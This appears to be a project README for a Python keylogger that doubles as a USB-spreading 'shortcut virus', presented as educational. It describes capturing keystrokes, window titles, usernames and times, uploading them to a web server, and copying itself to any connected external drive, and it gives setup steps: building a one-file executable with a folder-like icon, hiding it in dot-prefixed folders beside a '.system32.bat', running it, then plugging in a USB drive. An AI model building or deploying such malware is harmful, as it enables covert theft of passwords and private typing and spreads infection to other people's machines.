# Keylogging-Shortcut-Virus
Shortcut Virus cum Keylogger - Developed for educational purpose

`Keystrokes`, `Current Window`, `Username` and `Time` are logged locally when the system is offline (later it will get uploaded to the web server). If system is online, data is directly logged to the web server. The Application replicates itself to any external storage device connected to the infected system.

## Setup
- Use Pyinstaller to build an .exe file. rename it as `application.exe`
  `pyinstaller --onefile --icon="ICON_LOOKS_LIKE_A_FOLDER" KeyloggerApp.py`
- Create folder structure as follow,
  ----.winData
        --.usbData
            --.system32.bat
            --application.exe
            
- Move `.winData` folder to User Directory and Run application.exe (present in `.winData/.usbData/application.exe`)
- Plug a USB ;D
